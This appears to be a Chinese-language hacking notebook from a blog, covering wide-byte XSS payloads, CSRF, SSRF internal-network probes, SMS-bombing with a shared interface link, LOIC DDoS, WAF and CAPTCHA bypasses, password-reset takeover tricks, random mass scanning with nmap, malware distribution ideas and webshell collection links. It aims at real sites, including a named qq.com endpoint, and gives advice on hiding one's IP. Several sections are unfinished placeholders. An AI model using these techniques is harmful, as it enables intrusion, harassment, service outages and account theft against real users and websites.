<?php header("Content-Type: text/html;charset=GBK"); ?> 

<head> 
<title>gb xss</title> 
</head> 
<script> a="<?php echo $_GET['x'];?>"; 
</script>

我们会想到，需要使用闭合双引号的方法：

gb.php?x=1";alert(1)//
在magic_quotes_gpc=Off 时源代码会变成：

<script> a="1";alert(1)//";</script>

由于magic_quotes_gpc=On，双引号被转义成\"导致闭合失败

<script> a="1\";alert(1)//";</script>

由于网页头部指定了GBK编码，GBK编码第一字节（高字节）的范围是0x81～0xFE，第二字节（低字节）的范围是0x40～0x7E与0x80～0xFE。

gb.php?x=1%81";alert(1)//
此时当双引号会继续被转义为\",最终代码如下：

<script> a="1[0x81]\";alert(1)//";</script>

[0x81]\ 组合成了一个合法字符，于是我们的"被保留下来就会产生闭合，我们就成功触发了xss。

GB2312是被GBK兼容的，它的高位范围是0xA1～0xF7，低位范围是0xA1～0xFE（0x5C不在该范围内），把上面的PHP代码的GBK改为GB2312，在浏览器中处理行为同GBK，也许是由于GBK兼容GB2312，浏览器都做了同样的兼容：把GB2312统一按GBK行为处理。

 

宽字节注入防御
1、使用utf-8，编码宽字节注入；

ps：不仅gbk，韩文、日文等都是宽字节，都有可能存在宽字节注入漏洞。

2、过滤客户端提交的危险字符。

**更多资源**
xss平台、beef、xss自动化攻击

**新型XSS攻击**
复制黏贴劫持的新型xss攻击
**现象**
难度系数：⭐ 网站罕见指数：90/100
XSS漏洞仍旧常见，2018年百度、新浪微博、携程仍旧被爆出。但这种漏洞通常不值什么钱，且十分看运气。对于成熟的网页，这种漏洞都被黑客从手工到工具测完了，能挖出来也算你牛逼，而对于新发布的网页这总漏洞是十分常见的。


### XSS注入过程

如果你采用的是HTML注入，那么你首先需要寻找可注入的参数，以免你的输入被直接过滤掉了。比如通过查看网页的返回你将能找到某个可注入的参数，手工查找总是很繁琐，祝你好运

```bash
http://app.data.qq.com/?umod=commentsoutlet&act=count&siteid=3&libid=9&dataid=1480&score=1&func=haoping&_=1353475261886

```

==================================
 首先通过网页响应判断，是否过滤了 < , > , /符号，如果都没有，那么恭喜你获得了五年难得一遇的什么都不过滤参数，你可以执行一些危险代码了，比如：


```bash
<script>alert(1)</script>
```

=========
**参数没有过滤"**

```bash
http://xxxx.com/search.php?word=第一篇博客
http://xxxx.com/search.php?word=第一篇博客" onclick="alert(1)
```

## CSRF


**什么是**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710175822379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
只要受害者在登录状态，点击了一下你的链接，就可以完成攻击。一般你在选取csrf界面时你应该选择可以添加（管理员、用户等）、删除、修改等操作上。如果不能做这些即便有相关漏洞也是没什么危害的。
**危害性**
比xss更大，更难防范。通常可以用来以目标用户的名义发邮件、盗取目标用户账号、购买商品。通常用来做蠕虫攻击、刷SEO流量等。

### 实战
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711012444131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

用burpsuite即可快速生成误导链接，我们只需要引导用户去点击这个恶意链接就可以完成攻击
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512184941253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071101252633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185302955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185314721.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185329497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185532760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



### 防御
最有效的和简洁的手段是用token，如果你发现对方的网站有token那么你基本就没必要认为对方有csrf漏洞了
由于防御方法简单且难以被绕过，因此现在这种漏洞在大型网站几乎没有，小型网站你要想用此攻击获取普通用户的还是比较好搞，但是要想获取管理员的，你必须知道管理员请求数据包的方式。
>1.当用户发送重要的请求时需要输入原始密码
2.设置随机Token
3.检验referer来源，请求时判断请求连接是否为当前管理员正在使用的页面(管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败)
4.设置验证码
5.限制请求方式只能为POS

## SSRF
这个漏洞比CSRF难防范得多，一些大型网站甚至在稍微不注意的时候都会留下这个漏洞。
找真实站点搜索关键词：上传网络图片  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711014602709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

你甚至还可以利用其漏洞打穿内网添加管理员或远程下载一个木马
### 常见攻击演示
#### 图片上传
图片上传一般允许本地上传（SSRF在本地上传图是没有漏洞的）或者远程上传即访问类似于http://djhsds.img，远程上传的图意味着你访问了这个链接，所以这时候当你将地址换成内部地址时，意味着这个页面会展示很多内部信息。如下请求了一个内网地址端口，这个内网ip通常是要你自己用字典跑的，但是不要紧，内网ip也就这么几百个：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711020338432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
除了探测信息以外，你要是发现漏洞了还可以直接执行漏洞代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711024415355.png)

通常你在测试图片上传时会测试以下几种类型的反馈结果
http://对方内网ip/phpmyadmin
dict://对方内网ip:3306/info
ftp://对方内网ip:21

## 短信轰炸

攻击时常见的一种攻击，攻击者通过网站页面中所提供的发送短信验证码的功能处，通过对其发送数据包的获取后，进行重放，如果服务器短信平台未做校验的情况时，系统会一直去发送短信，这样就造成了短信轰炸的漏洞。

短信轰炸接口链接: https://pan.baidu.com/s/1Q7Oy_itZvqkS0kGk7WMTxw 提取码: d8nk

### 单个用户

指定单个用户，然后重放发送短信的HTTP请求。

BurpSuite中的一个Tricks：不修改参数，直接重放数据包，对于短信炸弹的测试非常实用

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520141144124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 轮询用户

每次测试这个，都是使用学校里的手机卡，遍历后面的几位，这样就可以直接询问同学是否收到短信；

每次都很刺激。

## 邮箱/短信轰炸

短信轰炸攻击时常见的一种攻击，攻击者通过网站页面中所提供的发送短信验证码的功能处，通过对其发送数据包的获取后，进行重放，如果服务器短信平台未做校验的情况时，系统会一直去发送短信，这样就造成了短信轰炸的漏洞。

攻击者通过填写他人的手机号，使用软件burpsuite的intruder功能重复提交发送短信的请求包，达到短时间内向他人的手机上发送大量垃圾短信的目的。

恶意攻击者可以利用漏洞攻击做到：

可对任意手机号轰炸
只可对当前手机号轰炸

在src中这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势:

* 加空格绕过
* 加任意字母绕过
* 前面加86绕过
* xff头伪造ip绕过



## DDOS 攻击

NTP DDOS 的原理

常见的方案是通过耗尽目标对象资源来达到攻击效果。

### 攻击过程

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515184745122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200010553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200048461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200109307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200144538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200129431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200201478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200219526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200318819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### DDOS 攻击手段

1）TCP

>可见客户端一直没有给服务器端发送ACK报文，而是一直不断地向服务器端发送连接请求，导致服务端忙于处理批量的连接请求，而没有空余资源可以处理其他正常用户的访问，导致服务器瘫痪。

2）UDP

>向目标端口发送大量无用的UDP报文来占满目标的带宽，导致目标服务器瘫痪。
>
>3）HTTP
>主要攻击目标是使用https协议的Web服务器上的访问服务，当发生攻击时攻击者向被攻击服务器大量高频的发送请求服务，使服务器忙于向攻击者提供https响应资源从而导致不能想正常的合法用户提供请求响应服务。

4）ICMP

>ICMP是（Internet Control Message Protocol，网络控制报文协议 ） 该攻击在短时间内向目标主机发送大量ping请求包，消耗主机资源，当目标系统响应攻击者发出的大量的  ping请求超出系统的最大承受限度时，目标系统资源就会耗尽殆尽，造成系统瘫痪或者无法正常提供其他服务。 目前使用ICMP洪水进行DoS攻击的情况已不多见，如图所示，攻击者在对目标进行ICMP洪水攻击时，100%ICMP包丢失，说明目标一个ICMP包都没有接收，这是因为现在大多数防火墙都已经设置ICMP包过滤机制，使得攻击者发起的ICMP洪水在目标网络边界就已经被过滤并丢弃，导致攻击无效。

5)SYN

>SYN攻击利用的是TCP的三次握手机制，攻击端利用伪造的IP地址向被攻击端发出请求，而被攻击端发出的响应 报文将永远发送不到目的地，那么被攻击端在等待关闭这个连接的过程中消耗了资源，如果有成千上万的这种连接，主机资源将被耗尽，从而达到攻击的目的。

#### 利用Nmap完成DDos攻击

虽然LOIC是window程序，但因为kali是允许一些exe执行的，在这里也确实可以执行此软件。如果你要进行网站攻击，那么你选择的目标URL最好最好是本身资源就消耗大的，以达到顺水推舟效果；等待一定时间就可以访问被攻击网站验证会否还能正常访问，有一点需要注意的是LOIC的DDOS攻击只对小站有效，大站无效的！下载链接： https://sourceforge.net/projects/loic/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515213035914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

你可以在使用LOIC测试前，去https://tool.chinaz.com/speedtest.aspx 网站查看一下目标网站速度。在使用LOIC后再去对比目标网速是否有变化。

## 待补充：DNS劫持

## 待补充：ARP欺骗



## 密码

如果您想防止攻击者使用他们窃取的密码攻击您，组织或用户可以采取一些步骤。您或您的组织可以采取的第一步是实施多重身份验证 (MFA)。考虑 MFA 的最简单方法是使用您知道的东西、您拥有的东西或您要执行身份验证的东西。“您拥有的东西”可以是智能手机上的身份验证服务，也可以是物理设备，例如 yubico 密钥。“你知道的东西”就是你的密码。添加“您拥有的东西”这一层会增加利用受损密码的难度，从而增强您的防御能力。如果您的组织需要，可以使用生物识别技术添加一个称为“你是谁”的层

您或您的组织应采取的下一步措施是增加密码的复杂性/长度要求，以防止被盗密码被用来对付您。增加密码的复杂性和长度将使攻击者更难暴力破解或在单词列表中找到它。例如，在单词列表中很容易找到诸如“passwordPASSWORD”之类的密码，只需 3 分钟即可暴力破解。诸如“1qaz!QAZ”之类的密码可能看起来足够复杂，因为它包含一个特殊字符、一个数字以及大小写字母。然而，由于它的长度，暴力破解只需要2个小时。

诸如“CASHEWf1veC4B3Rh@mmer”之类的密码不会列在任何单词列表中，因为它是随机单词的组合，其中字母替换为特殊字符和数字。此外，密码的长度会增加暴力破解所需的时间。复杂性和长度的结合导致密码需要 7332 个世纪才能蛮力。

最后，不要以明文形式存储您的密码。如果您维护一个用户数据库，则该数据库中的所有密码都应进行散列和加盐处理。如果您确实需要实施加盐，则必须避免两个常见错误。首先是避免使用硬编码的盐。如果攻击者识别出正在使用什么变量对用户的密码进行加盐，他们就可以生成彩虹表来破解位于数据库中的所有密码。要避免的第二件事是短盐。如果 salt 足够短，攻击者可以创建一个彩虹表，其中包含附加到每个可能密码的所有可能的 salt。但是，如果在数据库中使用长盐，则该数据库的彩虹表将非常大。


# 待补充：侦查

## 待补充： 日志审计

# 经验积累
## 待补充:第三方软件漏洞
### weblogic漏洞
## 待重点完善：语言漏洞
## 待重点完善：中间件
## 待重点完善：CVE
## 待重点完善：WAF绕过
### 基本知识
**安装**
阿里云盾：初次安装就有阿里云盾默认开启，可以打开进程管理器后在看到阿里云盾进程。WAF收费版只是有自定义的不同，功能上都差不多。
宝塔：一般非法网站都会用宝塔一站式搭建，所以一般这类网站就是宝塔防护。绕过难度：难
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707225447286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
安全狗：安全狗用的人也挺多的，但是他的防护效果不如其他防护软件好。因为历史悠久且免费所以使用的人多。绕过难度：简单
以下是安全狗默认开启和关闭的选项，按道理来说全部开启网站更安全，但是为了防止正常请求被错误拦截，这里是没有全部开启的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707231011334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### WAF经验
你在测试你的危险语句时，遭遇waf第一步是不要惊慌，一点一点的测试是因为匹配到了语句中的哪个词组或符号组被拦截了。
### 通用
#### 躲避流量监控
爬虫伪造
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708204226690.png)

代理池
延迟访问
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708204428465.png)

### SQL绕过
### 安全狗绕过
#### 默认未开启的防御绕过

主要利用安全狗是整段语句检测的，而SQL是逐步执行的
**情况：目标网站允许接收其他请求方式；方法：post提交+敏感语句处理**
当安全狗拒绝你直接用 `id=1 and 1=1 `直接插入在url的get请求中,你试着将其用在post请求中图是因为加了database所以被墙了。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707234946157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
这时候是可以绕过WAF的，但绕过不等于你注入成功。能否获得注入成功，取决于目标网站是否接受别的请求方式数据。如下图就只接受了GET。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708001152534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
如果这种方式能绕过且数据能被接收，但你却不能进行下一步，因为在默认情况下安全狗禁止了一切数据库查询，连post请求方式也不行。
<font color="#dd00dd">执行敏感关键字：database()</font><br /> 
但是安全狗监测数据库的注入的方式是整体语句，举个例子，`database()`被防御，但是`database`或者`()`不被防御。因此你可以尝试用注释符号隔开
![在这里插入图片描述](https://img-blog.csdnimg.cn/202107080041210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
<font color="#dd00dd">执行敏感关键字：union select </font><br /> 

%23:#  A:单独字符串 #A：代表注释，干扰  %0A:换行符

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708123824908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
****
其他绕过补充：上面一个已经足够了，但是想试试别的方法可以看以下
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708152942575.png)




**情况：只允许接收get数据包；方法：**
一般注入都是在get,安全狗对此就更多的使用防御。

### 文件上传绕过
#### 安全狗
**数据溢出-防匹配(xxx...)**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180150666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**符号变异-防匹配`(' " ;)`**
如图上传时修改数据包使其不闭合，可以绕过WAF。WAF在识别时一直想找闭合，但却找不着。但是php却会自动处理这类文件。对于安全狗，去掉后面的引号可以成功，但是去掉前面的引号却会导致绕过失败。这是因为安全狗的识别机制![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709201118607.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709202310936.png)
或者你使用`;.php`分号使安全狗认为是语句结束了 
**数据截断-防匹配(换行)**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180250295.png)
**重复数据-防匹配(参数多次)**
写了多次，服务器是以最后一位为主
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180311818.png)
安全狗误认为x.php没有对应的key,但是其实是写给了filename。上传后的文件是x.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070918032977.png)
上传后的文件是jpeg;x.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180333728.png)
斜杠也可以作为条件绕过
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180342299.png)

### xss 绕过
你在测试时你需要用好F12多监控对方网站到底做了哪些防御。![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710195547722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
单引号括起来后能防止对方的强制加上如h2之类的干扰
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710200005339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

标签语法替换
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071021435745.png)

特殊符号干扰
/ #
因爲/在js中代表语句的结束
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710214005267.png)

提交方式更改
垃圾数据溢出
加密解密算法
* 采用此方法你应该查看目标网站可以加解密的方式

结合其他漏洞绕过
## 待补充：0day漏洞

## 代理

那你要记得使用第三方电脑就是只的代理，当你非得使用自己的IP时，请制造大量迷惑信息保护自己，比如:多个IP，且很多代理IP进行了大量访问，而自己真实IP若不起眼。

然后IP被拉黑就是在所难免，挂VPN并没什么卵用，一个接一个的封，是不是很蛋疼……

想到了个方法，就是扫描时使用tor代理，几分钟会自动换ip，前提是你需要一个国外或香港的代理，不然是连接不上TOR匿名网络的。




## 非正常页面渗透

### 403/404/nginx

如果遇到http响应403或者404的则可以采用fuzz大法，一层一层fuzz尝试寻找可利用的信息。漏洞银行有一期衬衫的视频fuzz讲得很好。他用的工具是wfuzz，有兴趣的可以去看看。403页面也许你换成ip请求就可能进去了。而404页面并不代表就没有希望了，404页面也有很多漏洞可挖掘的。

我们先说下Host在请求头中的作用，在一般情况下，几个网站可能会部署在同一个服务器上，或者几个 web 系统共享一个服务器，通过host头来指定应该由哪个网站或者web系统来处理用户的请求。

而很多WEB应用通过获取HTTP HOST头来获得当前请求访问的位置，但是很多开发人员并未意识到HTTP HOST头由用户控制，从安全角度来讲，任何用户输入都是认为不安全的。

Burp学院实验室进行演示，首先普通用户访问admin页面会被限制,要使用admin用户登录才行。点击 管理面板（Admin panel）burp抓包查看，服务端返回403，"Access denied"禁止访问。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210519225941868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)




在Header头中添加X-Original-URL标头，发现已经有权限可以删除Administrator、carlos、wiener 帐号的管理员权限。



## 验证码攻破

如何破解淘宝登录页面的滑动验证码（说说各种思路以及如何实现）（这个问题扯了有 10 分钟）

验证码被攻破是一件对网站将会带来大伤害的事情。当被攻破后你可以：

* 无限制次的爆破用户名、爆破密码
* 无限制次的修改已爆破的用户名密码


### 验证码


**旧型**

验证码分为字符验证码，滑动，人机设备检测

现在更常见的验证码会在用户输入3-5次后出现

**新型**

语音验证码--将一段语言发送到收集


抓包，可以发现返回的数据中有一个加密的字符串（token），先记录下这个加密字符串
继续按照正常流程，登录邮箱获得验证码，返回填写验证码后，进入下一个填写新密码页面，发现 URL 后新增了一个加密验证的字符串
这个字符串就是之前数据包中记录的字符串，所以邮箱验证码这个环节可以绕过，直接用他人邮箱抓包获得加密字符串就可以重置他人密码

根据手机号找回密码，抓包，可以发现验证码直接显示 verifycode=xxxx，或者由 md5 加密后显示，解密即可（同理，有的时候输入用户名，抓包可以看到返回的手机号等其他信息）

根据邮箱找回密码,抓包直接返回,密码找回凭证可能在页面中

例如：
利用两个帐号同时点击找回密码，去邮箱查看找回密码的链接，发现两者的随机 token 只差 1-2，而且可以猜测出为服务器时间
所以可以用一个未知帐号和一个已知帐号同时点击找回密码，稍微遍历一下随机 token，就可以构造出未知帐号的密码找回链接
例如：
通过邮箱找回密码，正常流程去邮箱查看重置密码链接，发现链接处有一串 md5 加密字符串
字符串解密，类似 1491293277（10位），可以判断为 Unix时间戳，（可能md5）
重置他人密码只需要利用他人邮箱发送重置密码邮箱，在短时间内对 Unix时间戳 进行暴力破解，即可获得重置密码的链接
重置密码链接直接使用用户名来区别，改变用户名即可更改他人密码


验证码不刷新
验证码抓包绕过
验证码删除绕过
验证码置空绕过
修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP
账号后加空格绕过账号错误次数限制。
一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。

#### 
最简单的验证码破解思路是有一种特例：验证码的结果直接返回在前端，利用burpsuite抓取返回结果就可以得到，不过这种在2016年后出现频率已经很低了。

字符验证码：

【破解思路】：人工智能/打码平台/暴力破解

验证码直接爆破。一般四位数验证码一万次就爆破出来了，大概需要一分钟，六位数验证码也就十分钟左右。



滑动验证码：

【破解思路】：底图对比+模拟人滑动速度/打码平台

注册极验api收集全部底图，做自动化对比破解、

##### 双因子绕过

[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-NvnBNk4w-1621340549529)(C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210517184213357.png)]

### 打码平台

现在还能用的接码平台:

http://www.114sim.com/
https://yunduanxin.net/China-Phone-Number/
https://www.materialtools.com/

### 待补充：机器学习


## 批量刷漏洞

### 盲攻击

nmap -iR 100000 -Pn -p 445 -oG nmap.txt（随机地产生10万个IP地址，对其445端口进行扫描。将扫描结果以greppable（可用grep命令提取）格式输出到nmap.txt文件。

我在学习网络安全技术时会拿依稀小型网站
空间搜索引擎Censys
Shodan
ZoomEye

### 攻破类似网站

当你攻破一个网站时，复制并百度其类似的目录结构（打开F12--》network，分析请求地址即可得到），就可以得到同源码搭建的网站。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628123827814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 如何攻击更多人

盗取开发者账号替换正规应用

发布知名应用仿冒品

重打包技术

第三方下载站点

通过共享资源社区

破解软件联盟组织

SEO优化方式劫持搜索引擎结果，引导大众下载恶意软件

攻击主流的软件包如PYPI，npm,Docker hub...投放大量相似拼写相似的

攻击者通过分析特定行业的知名软件、项目、抢对应域名、模仿官网。并进行汉化版下载链接

下载节点缓存、CDN  缓存、P2P  缓存、城域网缓存，被投毒污染
当前互联网体系下，硬件、软件、物联网 OT 设备的更新和数据分发，均依赖网络基础设施来承
载，当终端客户进行更新、下载时通过网络链路拉取，网络基础设施为了提升效率节省成文，会对一些资源进行缓存。攻击者可通过定向污染缓存来实现投毒，最终攻击终端用户。

软件、硬件产品在发展的过程中，为了提升产品体验、升级能力、修复 BUG 等，需要进行更新升级，供应商因此建设有配套的更新升级系统。黑客通过自身的攻击能力与掌握的漏洞，对供应商发起攻击与横向渗透，最中取得升级系统的控制权。利用窃取或伪造证书签名的软件更新，将恶意软件带进攻
击目标入侵软、硬件开发公司，向目标项目的源码植入恶意代码
软件、硬件产品从无到有，需要经历漫长的开发生命周期流程，包括

### 一句话木马

有一个典型场景，当挖掘到一个潜在的上传漏洞，辛辛苦苦绕过了WAF，结果只上传一个一句话目标，这很可能直接出发主机层面的webshell文件警告，导致功亏一篑。一句话木马通常只有当你用在只是耍耍对面服务器时才用。

#### php

```bash
<?php phpinfo()?>
```



```bash

```


https://tennc.github.io/webshell/

https://github.com/tennc/webshell/zipball/master

https://github.com/tennc

https://github.com/tennc/webshell

https://github.com/tennc/webshell/archive/master.zip

https://github.com/tennc/webshell/releases

https://github.com/tennc/webshell/archive/v-2017-04-19.zip

http://tennc.github.io/webshell

Download link

Check github releases. Latest:

https://github.com/tennc/webshell/releases

https://github.com/ysrc/webshell-sample

https://github.com/xl7dev/WebShell

https://github.com/tdifg/WebShell

https://github.com/fictivekin/webshell

https://github.com/bartblaze/PHP-backdoors

https://github.com/malwares/WebShell

https://github.com/xypiie/WebShell

https://github.com/testsecer/WebShell

https://github.com/nbs-system/php-malware-finder

https://github.com/BlackArch/webshells

https://github.com/tanjiti/webshellSample

https://github.com/dotcppfile/DAws

https://github.com/theralfbrown/webshell

https://github.com/gokyle/webshell

https://github.com/sunnyelf/cheetah

https://github.com/tennc/webshell 各种webshell集合

https://github.com/ysrc/webshell-sample webshell样本

https://github.com/xl7dev/WebShell Webshell && Backdoor Collection

https://github.com/tdifg/WebShell WebShell Collect

https://github.com/fictivekin/webshell A console-based, JavaScripty HTTP client utility

https://github.com/bartblaze/PHP-backdoors A collection of PHP backdoors. For educational or testing purposes only.

https://github.com/malwares/WebShell webshell集合

https://github.com/xypiie/WebShell web-based shell

https://github.com/testsecer/WebShell WebShell收集项目

https://github.com/nbs-system/php-malware-finder Detect potentially malicious PHP files

https://github.com/BlackArch/webshells Various webshells

https://github.com/tanjiti/webshellSample webshell sample for webshel check module

https://github.com/dotcppfile/DAws Advanced Web Shell

https://github.com/theralfbrown/webshell Web Shell WSO

https://github.com/gokyle/webshell A shell for new Go webapps

https://github.com/sunnyelf/cheetah a very fast brute force webshell password tool

https://github.com/JohnTroony/php-webshells Common php webshells

https://github.com/evilcos/python-webshell python webshell

https://github.com/lhlsec/webshell webshell集合

https://github.com/shewey/webshell webshell&poc

https://github.com/boy-hack/WebshellManager w8ay 一句话WEB端管理工具

https://github.com/liulongfei/web_shell_bopo 一句话木马爆破工具

https://github.com/Ni7eipr/webshell 这是一个webshell收集项目

